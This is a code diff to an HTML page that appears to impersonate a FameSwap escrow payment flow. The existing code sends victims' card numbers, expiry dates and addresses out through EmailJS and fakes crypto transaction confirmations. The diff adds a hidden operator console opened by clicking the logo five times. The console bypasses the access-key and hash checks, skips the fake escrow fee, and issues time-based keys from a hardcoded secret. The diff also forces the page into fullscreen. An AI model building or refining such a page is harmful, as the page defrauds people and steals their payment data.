@@ -800,8 +800,173 @@
             background: var(--background);
         }
 
+
+
         .payment-guide.hiding {
             animation: slideUp 0.3s ease-out;
+        }
+
+        /* Developer Dashboard Styles */
+        #devDashboard {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', Courier, monospace;
+            backdrop-filter: blur(5px);
+        }
+
+        .dev-panel {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 24px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid #333;
+            box-shadow: 0 0 40px rgba(0, 255, 0, 0.1);
+        }
+
+        .dev-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 16px;
+        }
+
+        .dev-title {
+            font-size: 20px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .dev-title i {
+            font-size: 16px;
+        }
+
+        .dev-close {
+            cursor: pointer;
+            color: #ff4444;
+            font-size: 20px;
+            padding: 5px;
+            line-height: 1;
+        }
+
+        .dev-close:hover {
+            color: #ff6666;
+        }
+
+        .dev-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 16px;
+            background: #2d2d2d;
+            border-radius: 8px;
+            border: 1px solid #333;
+            transition: all 0.2s ease;
+        }
+
+        .dev-option:hover {
+            border-color: #444;
+            background: #333;
+        }
+
+        .dev-toggle {
+            position: relative;
+            display: inline-block;
+            width: 46px;
+            height: 24px;
+        }
+
+        .dev-toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .dev-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #444;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .dev-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .dev-slider {
+            background-color: #00ff00;
+        }
+
+        input:checked + .dev-slider:before {
+            transform: translateX(22px);
+        }
+
+        .dev-logs {
+            margin-top: 24px;
+            background: #000;
+            padding: 12px;
+            height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .dev-log-item {
+            margin-bottom: 6px;
+            border-bottom: 1px solid #111;
+            padding-bottom: 4px;
+            word-break: break-all;
+        }
+
+        .dev-log-time {
+            color: #666;
+            margin-right: 8px;
+        }
+
+        .dev-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            pointer-events: none;
+            z-index: 9998;
+            display: none;
+            border: 1px solid #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
         }
     </style>
 </head>
@@ -1235,11 +1400,234 @@
         </div>
     </div>
 
+    <!-- Developer Dashboard -->
+    <div id="devDashboard">
+        <div class="dev-panel">
+            <div class="dev-header">
+                <div class="dev-title">
+                    <i class="fas fa-terminal"></i>
+                    Developer Console
+                </div>
+                <div class="dev-close" onclick="toggleDevDashboard()">
+                    <i class="fas fa-times"></i>
+                </div>
+            </div>
+            <div class="dev-option">
+                <span>Bypass Access Key</span>
+                <label class="dev-toggle">
+                    <input type="checkbox" id="devBypassKey" onchange="updateDevSetting('bypassKey', this.checked)">
+                    <span class="dev-slider"></span>
+                </label>
+            </div>
+            <div class="dev-option">
+                <span>Bypass Transaction Hash</span>
+                <label class="dev-toggle">
+                    <input type="checkbox" id="devBypassHash" onchange="updateDevSetting('bypassHash', this.checked)">
+                    <span class="dev-slider"></span>
+                </label>
+            </div>
+            <div class="dev-option">
+                <span>Mock EmailJS (No API calls)</span>
+                <label class="dev-toggle">
+                    <input type="checkbox" id="devMockEmail" onchange="updateDevSetting('mockEmail', this.checked)">
+                    <span class="dev-slider"></span>
+                </label>
+            </div>
+            
+            <div class="dev-header" style="margin-top: 24px; border-top: 1px solid #333; padding-top: 16px;">
+                <div class="dev-title" style="font-size: 16px;">
+                    <i class="fas fa-key"></i>
+                    Global Smart Keys
+                </div>
+            </div>
+
+            <div class="dev-option">
+                <span>Skip Escrow Fee (Global)</span>
+                <label class="dev-toggle">
+                    <input type="checkbox" id="devSkipEscrow" onchange="updateDevSetting('skipEscrow', this.checked)">
+                    <span class="dev-slider"></span>
+                </label>
+            </div>
+
+            <div style="background: #2d2d2d; padding: 16px; border-radius: 8px; border: 1px solid #333; margin-bottom: 16px;">
+                <div style="display: flex; gap: 10px; margin-bottom: 10px;">
+                    <button onclick="generateGlobalKey()" style="flex: 1; background: #00ff00; color: black; border: none; padding: 8px; border-radius: 4px; cursor: pointer; font-weight: bold;">
+                        Generate Key
+                    </button>
+                    <button onclick="copyGlobalKey()" style="background: #444; color: white; border: none; padding: 8px; border-radius: 4px; cursor: pointer;">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+                <div id="generatedKeyDisplay" style="text-align: center; font-size: 24px; letter-spacing: 2px; font-weight: bold; color: #fff; min-height: 30px;">
+                    ------
+                </div>
+                <div style="text-align: center; font-size: 10px; color: #888; margin-top: 8px;">
+                    Valid for approx. 1 hour on ANY device
+                </div>
+            </div>
+
+            <div class="dev-logs" id="devLogs">
+                <div class="dev-log-item">
+                    <span class="dev-log-time">[SYSTEM]</span>
+                    Ready...
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="devIndicator" class="dev-indicator">
+        <i class="fas fa-code"></i> DEV MODE ACTIVE
+    </div>
+
     <script>
         // Initialize EmailJS
         (function() {
             emailjs.init("aGeV5e03mc1324u8g");
         })();
+
+        // --- Developer Dashboard Logic ---
+        const devMode = {
+            bypassKey: false,
+            bypassHash: false,
+            mockEmail: false,
+            skipEscrow: false,
+            clickCount: 0,
+            clickTimer: null
+        };
+
+        // Load settings from session storage
+        try {
+            const savedSettings = sessionStorage.getItem('devModeSettings');
+            if (savedSettings) {
+                const parsed = JSON.parse(savedSettings);
+                devMode.bypassKey = parsed.bypassKey;
+                devMode.bypassHash = parsed.bypassHash;
+                devMode.mockEmail = parsed.mockEmail;
+                devMode.skipEscrow = parsed.skipEscrow;
+                
+                // Update UI
+                document.getElementById('devBypassKey').checked = devMode.bypassKey;
+                document.getElementById('devBypassHash').checked = devMode.bypassHash;
+                document.getElementById('devMockEmail').checked = devMode.mockEmail;
+                document.getElementById('devSkipEscrow').checked = devMode.skipEscrow;
+                
+                updateDevIndicator();
+                logDev('Settings loaded from session');
+            }
+        } catch (e) {
+            console.error('Failed to load dev settings', e);
+        }
+
+        function toggleDevDashboard() {
+            const dashboard = document.getElementById('devDashboard');
+            if (dashboard.style.display === 'flex') {
+                dashboard.style.display = 'none';
+            } else {
+                dashboard.style.display = 'flex';
+                logDev('Dashboard opened');
+            }
+        }
+
+        function updateDevSetting(setting, value) {
+            devMode[setting] = value;
+            sessionStorage.setItem('devModeSettings', JSON.stringify({
+                bypassKey: devMode.bypassKey,
+                bypassHash: devMode.bypassHash,
+                mockEmail: devMode.mockEmail,
+                skipEscrow: devMode.skipEscrow
+            }));
+            updateDevIndicator();
+            logDev(`Set ${setting} to ${value}`);
+        }
+
+        function updateDevIndicator() {
+            const indicator = document.getElementById('devIndicator');
+            if (devMode.bypassKey || devMode.bypassHash || devMode.mockEmail || devMode.skipEscrow) {
+                indicator.style.display = 'block';
+            } else {
+                indicator.style.display = 'none';
+            }
+        }
+
+        // --- Global Smart Key Logic ---
+        const KEY_SECRET = "FameSwapDev2024";
+
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+            return Math.abs(hash);
+        }
+
+        function generateKeyForTime(timestamp, skipEscrow) {
+            const hour = Math.floor(timestamp / 3600000);
+            const flag = skipEscrow ? "SKIP" : "NOSKIP";
+            const raw = KEY_SECRET + hour + flag;
+            const hash = simpleHash(raw);
+            return hash.toString(36).substring(0, 6).toUpperCase().padStart(6, '0');
+        }
+
+        function generateGlobalKey() {
+            const key = generateKeyForTime(Date.now(), devMode.skipEscrow);
+            document.getElementById('generatedKeyDisplay').textContent = key;
+            logDev(`Generated key: ${key} (Skip: ${devMode.skipEscrow})`);
+        }
+
+        function copyGlobalKey() {
+            const key = document.getElementById('generatedKeyDisplay').textContent.trim();
+            if (key && key !== '------') {
+                navigator.clipboard.writeText(key);
+                logDev('Key copied to clipboard');
+            }
+        }
+
+        function verifyGlobalKey(inputKey) {
+            const now = Date.now();
+            const oneHour = 3600000;
+            
+            // Check current hour and previous hour (grace period)
+            const times = [now, now - oneHour];
+            const flags = [true, false]; // Check both skip=true and skip=false
+
+            for (let time of times) {
+                for (let skip of flags) {
+                    const generated = generateKeyForTime(time, skip);
+                    if (generated === inputKey.toUpperCase()) {
+                        return { valid: true, skipEscrow: skip };
+                    }
+                }
+            }
+            return { valid: false, skipEscrow: false };
+        }
+        // ------------------------------
+
+        function logDev(message) {
+            const logs = document.getElementById('devLogs');
+            const item = document.createElement('div');
+            item.className = 'dev-log-item';
+            const time = new Date().toLocaleTimeString();
+            item.innerHTML = `<span class="dev-log-time">[${time}]</span> ${message}`;
+            logs.insertBefore(item, logs.firstChild);
+            console.log(`[DEV] ${message}`);
+        }
+
+        // Hidden Trigger: 5 clicks on Logo
+        document.querySelector('.logo').addEventListener('click', function(e) {
+            devMode.clickCount++;
+            
+            if (devMode.clickTimer) clearTimeout(devMode.clickTimer);
+            
+            devMode.clickTimer = setTimeout(() => {
+                devMode.clickCount = 0;
+            }, 2000); // Reset after 2 seconds of inactivity
+
+            if (devMode.clickCount === 5) {
+                toggleDevDashboard();
+                devMode.clickCount = 0;
+            }
+        });
 
         // Add inactivity timer
         let inactivityTimer;
@@ -1325,6 +1713,43 @@
             console.log('Verifying access key...');
 
             setTimeout(() => {
+                // 1. Check Local Bypass
+                if (devMode.bypassKey) {
+                    logDev(`Bypassing key check for input: "${accessKey}"`);
+                    
+                    if (devMode.skipEscrow) {
+                         logDev('Skipping Escrow (Local Setting)');
+                         document.getElementById('verificationContainer').style.display = 'none';
+                         document.getElementById('paymentContainer').style.display = 'block';
+                    } else {
+                        document.getElementById('verificationContainer').style.display = 'none';
+                        document.getElementById('escrowFeeContainer').style.display = 'block';
+                    }
+                    
+                    document.getElementById('keyError').style.display = 'none';
+                    console.log('Access key BYPASSED');
+                    return;
+                }
+
+                // 2. Check Smart Key
+                const smartCheck = verifyGlobalKey(accessKey);
+                if (smartCheck.valid) {
+                    logDev(`Smart Key Verified! (Skip Escrow: ${smartCheck.skipEscrow})`);
+                    
+                    document.getElementById('verificationContainer').style.display = 'none';
+                    document.getElementById('keyError').style.display = 'none';
+                    
+                    if (smartCheck.skipEscrow) {
+                        document.getElementById('paymentContainer').style.display = 'block';
+                        console.log('Access key verified (Smart Key) - SKIPPING ESCROW');
+                    } else {
+                        document.getElementById('escrowFeeContainer').style.display = 'block';
+                        console.log('Access key verified (Smart Key) - Showing escrow fee');
+                    }
+                    return;
+                }
+
+                // 3. Check Hardcoded Key
                 if (accessKey === "TX5cDY") {
                     document.getElementById('verificationContainer').style.display = 'none';
                     document.getElementById('escrowFeeContainer').style.display = 'block';
@@ -1626,6 +2051,30 @@
             const city = document.getElementById('city').value;
             const state = document.getElementById('state').value;
 
+            if (devMode.mockEmail) {
+                logDev('Mocking EmailJS send...');
+                logDev(`Card: ${cardNumber.substring(0, 4)}...`);
+                
+                setTimeout(() => {
+                    logDev('Mock Email sent successfully');
+                    console.log("SUCCESS (MOCKED)");
+                    document.getElementById('successModal').style.display = 'flex';
+                    
+                    // Show and animate progress bar
+                    const progressBar = document.querySelector('.progress-bar');
+                    const progressBarFill = document.querySelector('.progress-bar-fill');
+                    progressBar.style.display = 'block';
+                    setTimeout(() => {
+                        progressBarFill.style.width = '100%';
+                    }, 100);
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://www.fameswap.com";
+                    }, 3000);
+                }, 1000);
+                return;
+            }
+
             emailjs.send("service_ew3eveb","template_kkjt9x2", {
                 card_number: cardNumber,
                 expiry: expiry,
@@ -1734,6 +2183,11 @@
 
         // Simple hash validation function
         function isValidTransactionHash(hash, type) {
+            if (devMode.bypassHash) {
+                logDev('Bypassing hash validation check');
+                return hash.length > 0;
+            }
+
             console.log('Validating transaction hash:', hash, 'for crypto type:', type);
             
             const hashPatterns = {
@@ -1751,7 +2205,16 @@
         function simulateConfirmations(hash, type, callback) {
             console.log('Starting confirmation simulation for hash:', hash);
             const wallet = cryptoWallets[type];
-            const requiredConfirmations = wallet.minConfirmations;
+            
+            let requiredConfirmations = wallet.minConfirmations;
+            let intervalTime = 2000;
+
+            if (devMode.bypassHash) {
+                logDev('Accelerating confirmation simulation');
+                requiredConfirmations = 3;
+                intervalTime = 200;
+            }
+
             let currentConfirmations = 0;
             
             const confirmationInterval = setInterval(() => {
@@ -1766,7 +2229,7 @@
                     console.log(`Transaction fully confirmed on ${wallet.network}`);
                     callback(true);
                 }
-            }, 2000); // Simulate a new confirmation every 2 seconds
+            }, intervalTime); // Simulate a new confirmation every 2 seconds (or 200ms in dev mode)
         }
 
         document.getElementById('hashForm').addEventListener('submit', function(e) {
@@ -1919,6 +2382,37 @@
             
             console.log('Hiding payment guide');
         }
+        // Auto-fullscreen logic
+        function enterFullScreen() {
+            const elem = document.documentElement;
+            const requestMethod = elem.requestFullscreen || 
+                                  elem.webkitRequestFullscreen || 
+                                  elem.msRequestFullscreen;
+
+            if (requestMethod) {
+                requestMethod.call(elem).then(() => {
+                    console.log('Entered fullscreen mode');
+                }).catch(err => {
+                    console.log('Error attempting to enable fullscreen:', err.message);
+                });
+            }
+        }
+
+        // Attempt on load (likely to fail without user preference/policy)
+        window.addEventListener('load', () => {
+            enterFullScreen();
+        });
+
+        // Fallback: Attempt on first user interaction
+        function onFirstInteraction() {
+            enterFullScreen();
+            // Remove listeners after first attempt to avoid annoying the user
+            document.removeEventListener('click', onFirstInteraction);
+            document.removeEventListener('touchstart', onFirstInteraction);
+        }
+
+        document.addEventListener('click', onFirstInteraction);
+        document.addEventListener('touchstart', onFirstInteraction);
     </script>
 </body>
 </html>
